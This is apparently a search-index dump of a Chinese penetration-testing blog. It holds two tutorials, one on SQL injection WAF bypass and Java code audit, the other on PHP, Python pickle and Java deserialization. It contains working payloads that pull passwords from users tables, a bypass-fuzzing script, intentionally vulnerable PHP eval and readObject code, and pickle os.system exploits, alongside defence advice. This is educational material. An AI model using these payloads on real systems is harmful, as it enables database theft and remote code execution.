!\"\" @$ @. \\N$ ... union select+@a1,password,3 from users %23 union select\\N$a1,password,3 from users %23 (6)函数 union select MD5('a') |1,2,database() from users--+ union select reverse('xx'),password,3 from users %23 union select ST_X(Point(1, 2))a,2,database() from users--+ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:45:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"位置四 (1) 空白符 %09,%0a,%0b,%0c,%0d,%20,%23,%27 -1' union select 1,2,user()%23from users--+ (2)注释 /*!*/ /**/ -1' union select 1,2,user()/**/from users--+ (3) 反引号 1' union select 1,2,password ``from users`` --+ (4)花括号 1' union select 1,2,{x password}from users --+ 1' union select 1,2,(password)from users --+ (5) 符号 \\N 1' union select 1,password,\\Nfrom users --+ 单双引号 1' union select 1,user(),\"\"from users --+ e . 1' union select 1,password,3e1from users --+ 1' union select 1,password,3.1from users --+ 组合 \\N%0C \\N%23 \\N%27 %7E\\N %21\\N %27\\N %2D\\N %7E\\N %2D%2D%0A %27-- --%40 --%27 --\"\" ... 1' union select 1,user(),\\NXXXX%23from users --+ 1' union select 1,user(),%27XXXX--from users --+ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:46:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"位置五 (1) 空白符 # %09,%0a,%0b,%0c,%0d,%20,%2E 1' union select 1,2,user() from%0dusers--+ (2)注释 /*!*/ /**/ -1' union select 1,2,user() from /**/users--+ (3)花括号 1' union select 1,user(),3 from(users) --+ 1' union select 1,user(),3 from{x users} --+ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:47:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"FUZZ 已经知道上面五个位置了，单一姿势是无法奏效绕过的，有些姿势也是需要大量 FUZZ 得到，使用大量字符编码对 SQL 语句的“位”进行 FUZZ，可以自己编写脚本进行fuzz实现bypass。这里直接贴别人的代码了懒得自己写(自己实现的时候按照这个思路进行散发即可)： import requests import itertools List = ['%20','%09','%0a','%0b','%0c','%0d','%2d%2d','%23','%a0','%2D%2D%2B','%5C%4E','\\\\N'] count = 0 num = 2 #fuzz num 个字符组合 target = 'http://localhost/sqli-labs-master/Less-1/?id=-1\\' ' for i in itertools.product(List,repeat=num): count += 1 print(count,':',len(List)**num) str = ''.join((i)) payload = '{}union select 1,user(),3 from users %23'.format(str) url = target + payload req = requests.get(url=url) if \"root@localhost\" in req.text: print(url) with open(\"result.txt\",'a',encoding='utf-8') as r: r.write(str + \"\\n\") 代码审计 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:48:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:49:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java中执行SQL语句的几种方式 1.使用JDBC的java.sql.Statement执行SQL语句（原生方式） 是执行SQL语句的原生方式，需要通过拼接来执行，若拼接的语句没有经过过滤，将出现SQL注入漏洞 import java.sql.*; public class TestSQL { public static void main(String []args) throws Exception { Class.forName(\"com.mysql.cj.jdbc.Driver\"); Connection con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/jsxp_test?useUnicode=true\u0026characterEncoding=utf-8\u0026useSSL=false\u0026serverTimezone=UTC\",\"test\",\"test123\"); try { String id = \"56\"; String sql = \"select * from cms_tag where f_tag_id=\" + id; Statement statement = con.createStatement(); ResultSet rs = statement.executeQuery(sql); while (rs.next()){ System.out.println(\"id: \"+rs.getInt(\"f_tag_id\") + \", name=\" + rs.getString(\"f_name\")); } }catch (Exception e){ e.printStackTrace(); } } } 2.使用JDBC的java.sql.PreparedStatement执行SQL语句 PreparedStatement是继承statement的子接口，包含已编译的SQL语句。 PreparedStatement会预处理SQL语句，SQL语句可具有一个或多个IN参数。IN参数的值在SQL语句创建时未被指定，而是为每个IN参数保留一个问号(?)作为占位符。每个问号的值，必须在该语句执行之前通过适当的setXXX方法来提供。如果是int型则用setInt，如果是string则用setString方法。 优势：速度快；防止SQL注入 //package src.main.java; import java.sql.*; public class TestSQL { public static void main(String []args) throws Exception { Class.forName(\"com.mysql.cj.jdbc.Driver\"); Connection con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/jsxp_test?useUnicode=true\u0026characterEncoding=utf-8\u0026useSSL=false\u0026serverTimezone=UTC\",\"test\",\"test123\"); try { String f_tag_id = \"56\"; String sql = \"select * from cms_tag where f_tag_id= ?\"; PreparedStatement pstatement = con.prepareStatement(sql); //设置占位符id变量(第一个参数为第几个?的索引) pstatement.setString(1, f_tag_id); //执行 ResultSet rs = pstatement.executeQuery(); while (rs.next()){ System.out.println(\"id: \"+rs.getInt(\"f_tag_id\") + \", name=\" + rs.getString(\"f_name\")); } }catch (Exception e){ e.printStackTrace(); } } } 3.使用Herbinate执行SQL语句 Hibernate将Java类映射到数据库表中，从Java数据类型映射到SQL数据类型，采用Hibernate查询语言（HQL）。 HQL语法与SQL类似，但有些许不同。 Hibernate对持久化类的对象进行操作也不是直接对数据库进行操作，因此HQL由Hibernate引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate引擎。 Hibernate有几种HQL参数绑定的方式可以有效避免SQL注入： 1.按命名参数绑定（参数名字） 在HQL语句中定义命名参数要用”:”开头 Query\u003cUser\u003e query=session.createQuery(“from User user where user.name=:username ”); String parm = \"Liming\"; query.setString(\"name\", parm); 2.按参数位置邦定： 在HQL查询语句中用”?”来定义参数位置，形式如下： Query query=session.createQuery(“from User user where user.name=? and user.age =? ”); query.setString(0,name); query.setInteger(1,age); // 索引，变量 // 同样使用setXXX()方法设定绑定参数，只不过这时setXXX()方法的第一个参数代表绑定参数在HQL语句中出现的位置编号（由0开始编号），第二个参数仍然代表参数实际值。 注：在实际开发中，提倡使用按名称绑定命名参数，因为这不但可以提供非常好的程序可读性，而且也提高了程序的易维护性，因为当查询参数的位置发生改变时，按名称邦定名参 数的方式中是不需要调整程 序代码的。 3.命名参数列表 4.类实例（JavaBean） 在Hibernate中可以使用setProperties()方法，将命名参数与一个对象的属性值绑定在一起，如下程序代码： Customer customer=new Customer(); customer.setName(“pansl”); customer.setAge(80); Query query=session.createQuery(“from Customer c where c.name=:name and c.age=:age ”); query.setProperties(customer); 5.setParameter()方法： 在Hibernate的HQL查询中可以通过setParameter()方法邦定任意类型的参数，如下代码: String hql=”from User user where user.name=:customername ”; Query query=session.createQuery(hql); query.setParameter(“customername”,name,Hibernate.STRING); 如上面代码所示，setParameter()方法包含三个参数，分别是命名参数名称，命名参数实际值，以及命名参数映射类型。对于某些参数类型setParameter()方法可以根据参数值的Java类型，猜测出对应的映射类型，因此这时不需要显示写出映射类型，像上面的例子，可以直接这样写:query.setParameter(“customername”,name);但是对于一些类型就必须写明映射类型，比如java.util.Date类型，因为它会对应Hibernate的多种映射类型，比如Hibernate.DATA或者Hibernate.TIMESTAMP。 4.使用MyBatis执行SQL语句 MyBatis是一个Java持久化框架，他通过XML描述符或注解把对象与存储过程或SQL语句连接起来 #{变量} 可以防止注入，底层是用prepareStatement实现的/使用占位符?来实现的 ${变量} 不能防注入，底层的用拼接实现的 小例子: 1、新建一个maven项目，在pom文件中添加mybatis依赖及MySQL依赖 \u003c!-- mybatis核心依赖 --\u003e \u003c!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis\u003c/artifactId\u003e \u003cversion\u003e${mybatis.version}\u003c/version\u003e \u003c/dependency\u003e \u003c!-- mysql驱动 --\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e${mysql.version}\u003c/version\u003e \u003c/dependency\u003e mybatis配置文件： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE configuration PUBLIC \"-//mybati","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:49:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常见SQL注入(漏洞分类挖掘技巧) 白盒挖掘层面大致可以将SQLi的类型分为六类： 1、入参直接动态拼接； 2、预编译有误； 3、框架注入（Mybatis+Hibernate）； 4、order by 绕过预编译； 5、%和_绕过预编译； 6、SQLi检测绕过 1.SQL语句参数直接动态拼接 未使用PreparedStatement或者未正确使用PreparedStatement，直接使用拼接，并且未进行过滤，导致sql注入 2.预编译有误 比如：虽然使用了PreparedStatement，但是sql语句中还是进行了拼接，这样还是会导致sql注入产生 3.框架使用不当导致SQL注入 Mybatis #{变量} 可以防止注入，底层是用prepareStatement实现的 ${变量} 不能防注入，底层的用拼接实现的 若使用${参数}的方式，并且对用户输入过滤不严格的情况下，仍然会产生sql注入 Hibernate Hibernate有几种HQL参数绑定的方式可以有效避免SQL注入 但Hibernate支持远程的SQL语句执行，若是直接采用拼接的方式，则会产生SQL注入 4.order by 绕过预编译 某些情况下是不能使用PreparedStatement的，比如在order by下。order by子句后面需要加字段名或字段位置，而字段名是不能带引号的，否则就会被认为是一个字符串而不是字段名。PreparedStatement是使用占位符传递参数的，传递的字符都会有单引号包裹，就会导致order by子句失效。 所以，当使用order by子句进行查询时，需要使用拼接的方式，在这种情况下很可能产生sql注入。因此要防御SQL注入，就要进行字符串过滤。 5.%和_模糊查询 在Java预编译查询中不会对%和_进行转义处理，而%和_刚好是like查询的通配符，如果没有做好相关的过滤，就可以导致恶意模糊查询，占用服务器性能，甚至可能耗尽资源，造成服务器宕机。 此类攻击场景大多出现在查询的功能接口中，直接对%进行过滤就是最简单有效的防御方式。 6.MyBatis常见SQL注入漏洞 6.1order by查询 要使用order by就只能使用${参数} 6.2like查询 Mybatis的like子句使用#{}会报错，只能用${} 6.3in参数 Mybatis的in查询使用#{}会报错，只能用${} ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:49:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常规代码审计 常见关键字： Statement ceateStatement PrepareStatement like '%{ in(${ select update insert ... 漏洞防御 最有效的是进行预编译手段 在Java开发中除了原生的JDBC，可以选择Druid、MyBatis等 类型转换，比如已知是int型，就对接收的参数都强转成int型 进行过滤 参考 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection https://cloud.tencent.com/developer/article/1534109 https://mp.weixin.qq.com/s/qG_m7YXvEw2PwFXQDj6_qw https://www.ms509.com/2020/06/24/Waf-Bypass-Sql/ https://xz.aliyun.com/t/368 MySQL绕过小结 (qq.com) https://www.cnblogs.com/peterpan0707007/p/8242119.html ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:49:3","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"反序列化 **序列化：**把对象转换为字符串 存到硬盘中(可以以特定的格式在进程中跨平台、安全的进行通信) –\u003e实际场景会存到数据库中(redis等键值对类型的数据库) **反序列化：**用到的时候，再把字符串反序列化为对象使用 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞原理 序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"PHP反序列化 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞触发条件： 以下三者缺一不可 unserialize函数的变量可控 php文件中存在可利用的类 类中有魔术方法 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:1","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"魔术方法 __construct() #当一个对象创建时被调用 __destruct() #当一个对象销毁时被调用 __toString() #当一个对象被当作一个字符串使用 __sleep() #在对象在被序列化之前运行 __wakeup #将在序列化之后立即被调用 __call() #在对象上下文中调用不可访问的方法时触发 __callStatic() # 在静态上下文中调用不可访问的方法时触发 __get() # 用于从不可访问的属性读取数据 __set() # 用于将数据写入不可访问的属性 __isset() # 在不可访问的属性上调用isset()或empty()触发 __unset() # 在不可访问的属性上使用unset()时触发 __invoke() # 当脚本尝试将对象调用为函数时触发 # 等其他魔术方法 先搞清楚序列化之后各个字段的意义: 例如： \u003c?php class Example { var $var = ''; function __destruct() { eval($this-\u003evar); } } unserialize($_GET['a']); ?\u003e　接下来构造序列化数据：a=O:4:\"test\":1:{s:1:\"b\";s:10:\"phpinfo();\";} 成功显示了phpinfo页面：在反序列化该数据时，自动触发了_destruct()函数,执行 eval(phpinfo()): ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:2","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"CTF类似题目 https://cgctf.nuptsast.com/challenges#Web https://bbs.ichunqiu.com/forum.php?mod=viewthread\u0026tid=11116\u0026highlight=writeup \u003c?php //test /* $a='xiaodi'; echo $a.\"\u003chr\u003e\"; echo serialize($a).\"\u003chr\u003e\"; echo unserialize('s:6:\"xiaodi\";'); */ /* //代码执行 class xiaodi{ var $xd=''; function __destruct(){ eval($this-\u003exd); } } unserialize($_GET['a']); */ //O:1:\"F\":1:{s:3:\"var\";s:10:\"phpinfo();\";} //O:6:\"xiaodi\":1:{s:2:\"xd\";s:10:\"phpinfo();\";} //sql注入 /* class sql{ var $var=''; function __destruct(){ echo 'select * from admin where username='.($this-\u003evar); } } unserialize($_GET['a']); //O:3:\"sql\":1:{s:3:\"var\";s:6:\"xiaodi\";} */ class just4fun { var $enter; var $secret; } if (isset($_GET['pass'])) { $pass = $_GET['pass']; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-\u003esecret = \"*\"; if ($o-\u003esecret === $o-\u003eenter) echo \"Congratulation! Here is my secret: \".$o-\u003esecret; else echo \"Oh no... You can't fool me\"; } else echo \"are you trolling?\"; //O:8:\"just4fun\":2:{s:5:\"enter\";N;s:6:\"secret\";R:2;} // 值给N, 后面的值给R N+2=R ?\u003e　","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:3","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Python反序列化 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"概述 Python中有两个模块可以实现对象的序列化，pickle和cPickle，区别在于cPickle是用C语言实现的，pickle是用纯python语言实现的，用法类似，cPickle的读写效率高一些。python3标准库中不再叫cPickle，而是只有pickle。python2中两者都有。 pickle的应用场景一般有以下几种： 在解析认证token，session的时候（尤其web中使用的redis、mongodb、memcached等来存储session等状态信息）； 将对象Pickle后存储成磁盘文件； 将对象Pickle后在网络中传输。 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:1","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"pickle反序列化 pickle pickle 具有两个重要的函数： 一个是dump(), 作用是接受一个文件句柄和一个数据对象作为参数，把数据对象以特定的格式保存到给定的文件中； 另一个函数是load()，作用是从文件中取出已保存的对象，pickle 知道如何恢复这些对象到他们本来的格式。 pickle.dump(obj, file, protocol=None, *, fix_imports=True) #输出为文件对象 pickle.dumps(obj, protocol=None, *, fix_imports=True) #输出为 bytes 对象 pickle.load(file) #load参数是文件句柄 pickle.loads(file) #loads参数是字符串 note: python2中的序列化文件如果想在python3中读取，需要修改编码。 #python2 with open('mnist.pkl', 'rb') as f: l = list(pickle.load(f)) #python3 with open('mnist.pkl', 'rb') as f: u = pickle._Unpickler(f) u.encoding = 'latin1' p = u.load() 我这里就只用Python3了 __reduce__方法 类似于PHP中的__wakeup__魔法函数，pickle允许任意对象通过定义__reduce__方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。第一个参数是可调用(callable)的对象，第二个是该对象所需的参数元组 __reduce__ 被定义之后，当对象被Pickle时就会被调用 要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用 __reduce_ex__ 首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__ 构造一个存在漏洞的简单代码： import os import pickle class Test1(object): def __reduce__(self): return os.system, ('whoami',) testObj = Test1() payload = pickle.dumps(testObj) print(payload) pickle.loads(payload) 如果需要在web中请求传输，url编码后就可以发送了。 指定protocol pickle.dumps(object)在生成序列化数据时可以指定protocol参数，其取值包括： 当protocol=0时，序列化之后的数据流是可读的（ASCII码） 当protocol=3时，为python3的默认protocol值，序列化之后的数据流是hex码 import os import pickle class Test1(object): def __reduce__(self): return os.system, ('whoami',) testObj = Test1() payload = pickle.dumps(testObj, protocol=0) print(payload) # # pickle.loads(payload) print(payload.decode()) # 将byte类型转化为string类型 pickletools模块 帮助我们了解每一步执行原理。需要我们了解每一个操作符的含义。 pickletools.dis(picklestring)： 可以更方便的看到每一步的操作原理。 pickletools.optimize(picklestring)： 消除未使用的 PUT 操作码之后返回一个新的等效 pickle 字符串。 优化后的 pickle 将更为简短，耗费更为的传输时间，要求更少的存储空间并能更高效地解封。也即上面分析能够经过简化的过程： import os import pickle import pickletools class Test1(object): def __reduce__(self): return os.system, ('whoami',) testObj = Test1() payload = pickle.dumps(testObj, protocol=0) print(payload) # # pickle.loads(payload) # print(payload.decode()) # 将byte类型转化为string类型 pickletools.dis(payload) 一些指令集： MARK = b'(' # push special markobject on stack STOP = b'.' # every pickle ends with STOP POP = b'0' # discard topmost stack item POP_MARK = b'1' # discard stack top through topmost markobject DUP = b'2' # duplicate top stack item FLOAT = b'F' # push float object; decimal string argument INT = b'I' # push integer or bool; decimal string argument BININT = b'J' # push four-byte signed int BININT1 = b'K' # push 1-byte unsigned int LONG = b'L' # push long; decimal string argument BININT2 = b'M' # push 2-byte unsigned int NONE = b'N' # push None PERSID = b'P' # push persistent object; id is taken from string arg BINPERSID = b'Q' # \" \" \" ; \" \" \" \" stack REDUCE = b'R' # apply callable to argtuple, both on stack STRING = b'S' # push string; NL-terminated string argument BINSTRING = b'T' # push string; counted binary string argument SHORT_BINSTRING= b'U' # \" \" ; \" \" \" \" \u003c 256 bytes UNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argument BINUNICODE = b'X' # \" \" \" ; counted UTF-8 string argument APPEND = b'a' # append stack top to list below it BUILD = b'b' # call __setstate__ or __dict__.update() GLOBAL = b'c' # push self.find_class(modname, name); 2 string args DICT = b'd' # build a dict from stack items EMPTY_DICT = b'}' # push empty dict APPENDS = b'e' # extend list on stack by topmost stack slice GET = b'g' # push item from memo on stack; index is string arg BINGET = b'h' # \" \" \" \" \" \" ; \" \" 1-byte arg INST = b'i' # build \u0026 push class instance LONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg LIST = b'l' # build list from topmost stack items EMPTY_LIST = b']' # push empty list OBJ = b'o' # build \u0026 push class instance PUT = b'p' # store stack top in memo; index is string arg BINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg LONG_BINPUT = b'r' # \" \" \" \" \" ; \" \" 4-byte arg SETITEM = b's' # add key+value pair to dict TUPLE = b't' # build tuple from topmost stack items EMPTY_TUPLE ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:2","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"其他第三方序列化库 # marshmallow pip3 install marshmallow # MessagePack pip3 install msgpack-python # PyYAML # Jsonpickle # Shelve ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:3","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"测试方法 查找是否引入pickle/cPickle等序列化库； 若引入则查看并是否进行了pickle.load(param)或pickle.loads(param)操作； 若参数输入可控，则可能存在反序列化漏洞，构造payload进行利用。 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:4","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"工具 pker：https://github.com/eddieivan01/pker 借助该工具，可以省去人工构造payload，根据自己的相关需求可以自动生成相应的序列化数据。 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:5","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"修复方案 1） 确保反序列化对象不可控，且在传递前请进行签名或者加密，防止篡改和重播 2） 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据 3）将 pickle 加载的数据列入白名单，可使用官方推荐的find_class方法,使用白名单限制反序列化引入的对象 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:6","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java反序列化 序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 Java 序列化是指把 Java 对象转换为字节序列的过程，便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化(能够被反序列化的类必须要实现Seializable或者Externlizable接口)。 当开发者重写readObject方法或者readExternal方法时，若其中隐藏一些危险的操作且未对正在进行序列化的字节流进行充分的检测时，则可能存在反序列化漏洞。 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"条件 类必须实现反序列化接口，同时设置serialVersionUID以便适用不同jvm环境（可通过SerializationDumper这个工具来查看其存储格式,主要包括Magic头：0xaced,TC_OBJECT:0x73,TC_CLASS:0x72,serialVersionUID,newHandle） 程序中存在一条可以产生安全问题的利用链(Gadget chain)，如远程代码执行 触发点（当程序中某处触发点在还原对象的过程中，能够成功地执行构造出来的利用链，则会成为反序列化漏洞的触发点） ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:1","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"反序列化示例 将String对象obj1序列化后写入object文件，后反序列化得到对象obj2: package src.main.java; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class TestSeri { public static void main(String []args) throws Exception{ //定义obj对象 String obj = \"hello java!\"; //创建一个包含对象进行反序列化信息的 object数据文件 FileOutputStream fos = new FileOutputStream(\"object\"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将obj对象写入object文件 os.writeObject(obj); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"object\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); } } object文件中的内容： 其中Ac ed 00 05是java序列化内容的特征，base64编码后是rO0ABQ== ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:2","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"使用场景: • http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等 • Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\\xac\\xed） • xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml） • json(Jackson，fastjson) http请求中包含 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:3","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞成因示例 package src.main.java; import java.io.*; public class TestSeri { public static void main(String []args) throws Exception{ //定义obj对象 MyObject myObj = new MyObject(); myObj.name = \"hello\"; //创建一个包含对象进行反序列化信息的 object2数据文件 FileOutputStream fos = new FileOutputStream(\"object2\"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将obj对象写入object文件 os.writeObject(myObj); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"object2\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 MyObject objDisk = (MyObject)ois.readObject(); System.out.println(objDisk.name); ois.close(); } } class MyObject implements Serializable{ public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行打开计算器程序的命令 Runtime.getRuntime().exec(\"calc.exe\"); } } 查看文件内容： 漏洞发生在反序列化过程，MyObject类实现了Serializable接口，并重写了readObject()函数（从源输入流中读取字节序列，反序列化成对象），这里定制的行为是打开计算器： 攻击时序图： 